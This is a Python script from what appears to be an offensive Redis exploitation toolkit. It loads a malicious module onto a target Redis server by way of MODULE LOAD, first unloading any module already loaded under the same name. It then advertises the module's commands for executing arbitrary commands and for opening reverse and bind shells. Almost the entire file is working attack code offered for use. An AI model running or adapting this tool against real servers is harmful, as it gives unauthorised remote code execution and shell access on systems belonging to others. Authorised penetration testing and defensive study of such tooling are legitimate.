from .common import proceed_with_cached_connection, decode_bytes_kv_pair, print_kv_pairs, EVIL_MODULE_NAME
from .common import exceptions



def load_malicious_module_help():
    return "\nUse this attack to load a malicious Redis module on\n" \
    "the target server.\n" \
    "The malicious Redis module is already provided with\n" \
    "this tool. All you need to do is to upload it to the\n" \
    "Redis server.\n" \
    "\n[*] Preconditions:\n" \
    "1. In order to load a module, it must be present on\n" \
    "the Redis server.\n" \
    "2. The module must have execute permissions.\n" \
    "\n[*] Outcome:\n" \
    "With this attack, you can:\n" \
    "1. Run arbitrary commands on the Redis server\n" \
    "2. Obtain a Reverse Shell session\n" \
    "3. Obtain a Bind Shell session\n"



def load_malicious_module(redis):

    module_path = input("\nModule path (on Redis server): ") or None

    if not module_path:
        print("\n[-] Missing module path!\n")
        return True

    print("\n[*] Currently loaded modules:")

    for module_info in redis.module_list():

        __module_info = decode_bytes_kv_pair(module_info)

        print_kv_pairs(__module_info)

        if __module_info["name"] == EVIL_MODULE_NAME:
            # Module already loaded? or some other module of same name is loaded!
            # 
            # We won't ask the user here for a simple fact:
            # If they are running this attack, they want to load the malicious module
            # 
            # If the malicious module had already been loaded, there's no point in
            # running this attack...
            print("\n[*] Unloading module:", __module_info["name"])

            try:
                if redis.module_unload(__module_info["name"]):
                    print("[*] Module unloaded successfully!")

            except Exception as e:
                print(e)
                print("\n[-] Error occured while unloading the specified module.\n\nStopping this attack...\n")
                return True

    print("\n[*] Loading module:", module_path)

    try:

        if redis.module_load(module_path):
            print("\n[*] Module loaded successfully!")

            print("\n[*] Currently loaded modules:")
            for module_info in redis.module_list():
                __module_info = decode_bytes_kv_pair(module_info)
                print_kv_pairs(__module_info)

            print("\nWith this module loaded, you can now do the following:")
            print("(1) Execute Commands:     SYS.EXEC <CMD>")
            print("(2) Obtain Reverse Shell: SYS.REVSHELL <LHOST> <LPORT>")
            print("(3) Obtain Bind Shell:    SYS.BINDSHELL <RHOST> <RPORT>\n")

    except exceptions.ModuleError as e:
        # Some issue happened while loading the module...
        print(e)
        print("\n[-] The specified module couldn't be loaded...\n")
        return False

    except Exception as e:
        print(e)
        return False

    return True




if __name__ == "__main__":
    redis = proceed_with_cached_connection()
    load_malicious_module(redis)